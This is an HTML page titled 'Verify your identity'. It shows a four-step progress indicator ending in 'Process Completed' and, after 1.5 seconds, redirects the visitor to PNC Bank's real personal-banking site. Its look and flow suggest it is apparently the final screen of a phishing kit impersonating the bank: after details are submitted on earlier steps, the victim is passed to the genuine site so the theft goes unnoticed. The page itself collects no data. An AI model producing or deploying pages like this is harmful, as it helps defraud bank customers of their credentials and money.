<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
    <title>Verify your identity</title>

    <style>
        :root {
            font-family: "Open Sans", sans-serif;
        }
    </style>
</head>

<body class="min-h-screen flex flex-col">
    <!-- Navbar -->
    <nav class="bg-[#404E57] p-2">
        <div class="p-1">
            <img class="w-20" src="./assets/Logo (1).svg" alt="Logo">
        </div>
    </nav>

    <!-- Split Background -->
    <div class="relative min-h-[calc(100vh-4rem)] flex-grow">
        <div class="absolute top-0 left-0 right-0 h-1/3 bg-[#2D3943]"></div>
        <div class="absolute bottom-0 left-0 right-0 h-1/2 bg-white"></div>
        <div class="relative flex flex-col items-center justify-center">
            <div class="w-full max-w-4xl bg-white shadow-lg border border-8 border-gray-200 mt-8 mb-12 mx-4 sm:mx-8 lg:mx-auto h-auto sm:h-auto">
                <div class="p-6 sm:p-12">
                    <div class="p-4 sm:p-8">
                        <div class="flex flex-col items-center justify-center">
                            <!-- Step Indicator -->
                            <div class="flex items-center space-x-4 sm:space-x-6 mb-6">
                                <div class="w-8 h-8 sm:w-12 sm:h-12 rounded-full border-2 border-gray-300 flex items-center justify-center bg-white">
                                    <span class="text-gray-400 text-sm sm:text-base">1</span>
                                </div>
                                <div class="w-8 h-8 sm:w-12 sm:h-12 rounded-full border-2 border-gray-300 flex items-center justify-center bg-white">
                                    <span class="text-gray-400 text-sm sm:text-base">2</span>
                                </div>
                                <div class="w-8 h-8 sm:w-12 sm:h-12 rounded-full border-2 border-gray-300 flex items-center justify-center bg-white">
                                    <span class="text-gray-400 text-sm sm:text-base">3</span>
                                </div>
                                <div class="w-8 h-8 sm:w-12 sm:h-12 rounded-full border-2 border-[#008300] flex items-center justify-center bg-[#008300]">
                                    <span class="text-white text-sm sm:text-base">4</span>
                                </div>
                            </div>

                            <div class="text-center">
                                <!-- Checkmark Container with Circle Background -->
                                <div class="mt-6 sm:mt-12 w-16 h-16 sm:w-20 sm:h-20 bg-green-200 rounded-full flex items-center justify-center mx-auto mb-4">
                                    <!-- Checkmark Icon -->
                                    <svg class="w-8 h-8 sm:w-12 sm:h-12 text-[#008300]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
                                    </svg>
                                </div>

                                <h1 class="text-xl sm:text-2xl font-semibold text-[#008300] mb-4">Process Completed</h1>
                                <p class="text-base sm:text-lg text-gray-700 mb-4">Thank you for completing the steps. Your submission has been successfully processed.</p>
                                <p class="text-gray-600 mb-6">If you have any further questions or need assistance, feel free to <a href="mailto:support@example.com" class="text-[#0069AA] hover:underline">contact us</a>.</p>
                                <a href="/" class="px-4 py-2 sm:px-6 sm:py-2 bg-[#0069AA] text-white rounded-full hover:bg-[#003a5e]">Go to Home</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bg-[#2D3943] text-white text-center py-4 mt-auto">
        <p>&copy; 2024 Your Company. All rights reserved.</p>
        <div class="flex justify-center space-x-2 sm:space-x-4 mt-2">
            <a href="#" class="hover:text-gray-400">Privacy Policy</a>
            <a href="#" class="hover:text-gray-400">Terms of Service</a>
            <a href="#" class="hover:text-gray-400">Contact Us</a>
        </div>
    </footer>

    <!-- JavaScript for redirection -->
    <script>
        setTimeout(function() {
            window.location.href = 'https://www.pnc.com/en/personal-banking.html';
        }, 1500); // Redirects after 3000 milliseconds (3 seconds)
    </script>
</body>

</html>